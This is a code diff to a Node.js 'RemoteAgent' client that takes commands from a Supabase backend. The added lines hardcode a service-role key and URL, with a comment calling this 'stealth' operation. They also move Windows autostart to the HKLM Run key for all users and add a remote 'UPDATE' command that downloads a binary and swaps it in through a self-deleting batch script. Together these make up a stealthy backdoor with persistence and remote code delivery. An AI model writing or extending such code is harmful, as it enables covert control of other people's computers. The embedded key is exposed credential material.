@@ -3,14 +3,12 @@ const os = require('os');
 const { exec } = require('child_process');
 const path = require('path');
 const fs = require('fs').promises;
-require('dotenv').config();
 
-if (!process.env.SUPABASE_URL || !process.env.SUPABASE_KEY) {
-  console.error("Missing environment variables.");
-  process.exit(1);
-}
+// Hardcoded credentials for "stealth" single-file operation
+const SUPABASE_URL = "https://rghhlxgwetysbyfiwwhu.supabase.co";
+const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJnaGhseGd3ZXR5c2J5Zml3d2h1Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjgwMjQ3NCwiZXhwIjoyMDkyMzc4NDc0fQ.BlVn3BnMrZIas5FlVGf6lXDsh47dsrINIb46y2hF_LU";
 
-const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
+const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 const COMPUTER_NAME = os.hostname();
 
 const MAX_LOG_ENTRIES = 100;
@@ -88,12 +86,17 @@ async function scanDirectory(dirPath, foldersOnly = false) {
  */
 function ensurePersistence() {
   if (process.platform === 'win32') {
-    const scriptPath = path.resolve(__filename);
-    // We use a VBS-style launcher or direct node call. Here is the direct call:
-    const regCmd = `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RemoteAgent" /t REG_SZ /d "node ${scriptPath}" /f`;
+    // Detect if running as a compiled .exe (via pkg) or a raw script
+    const isCompiled = Boolean(process.pkg);
+    const appPath = isCompiled ? `"${process.execPath}"` : `node "${path.resolve(__filename)}"`;
+
+    // Using HKEY_LOCAL_MACHINE ensures it runs for all users. 
+    // This requires the first run to be "Run as Administrator".
+    const regCmd = `reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RemoteAgent" /t REG_SZ /d "${appPath}" /f`;
     
     exec(regCmd, (err) => {
-      if (err) console.error("Persistence setup failed:", err);
+      if (err) logToCloud(`Persistence setup failed: ${err.message}`, 'error');
+      else logToCloud("Persistence established in HKLM Registry.");
     });
   }
 }
@@ -141,6 +144,45 @@ async function handleCommand(payload) {
         if (path.dirname(data.path) !== path.dirname(data.newPath)) {
           await scanDirectory(path.dirname(data.newPath));
         }
+        break;
+
+      case 'UPDATE':
+        if (!data?.storagePath) throw new Error("No storagePath provided for update");
+        
+        const { data: blob, error: downloadError } = await supabase.storage
+          .from('updates')
+          .download(data.storagePath);
+
+        if (downloadError) throw downloadError;
+
+        const arrayBuffer = await blob.arrayBuffer();
+        const buffer = Buffer.from(arrayBuffer);
+        
+        const isCompiled = Boolean(process.pkg);
+        const currentPath = isCompiled ? process.execPath : path.resolve(__filename);
+        const newPath = currentPath + ".new";
+        const updaterPath = path.join(os.tmpdir(), `updater_${Date.now()}.bat`);
+
+        // Write the new binary to a temporary path
+        await fs.writeFile(newPath, buffer);
+        
+        // Create a batch script to swap the files once this process exits
+        const batchScript = [
+          '@echo off',
+          'timeout /t 3 /nobreak > nul',
+          `del /f /q "${currentPath}"`,
+          `move "${newPath}" "${currentPath}"`,
+          `start "" "${currentPath}"`,
+          'del "%~f0"'
+        ].join('\r\n');
+
+        await fs.writeFile(updaterPath, batchScript);
+        await logToCloud("Update downloaded. Swapping binary and restarting...");
+        
+        // Execute updater detached and kill the current process
+        const { spawn } = require('child_process');
+        spawn('cmd.exe', ['/c', updaterPath], { detached: true, stdio: 'ignore' }).unref();
+        process.exit(0);
         break;
 
       case 'DOWNLOAD':
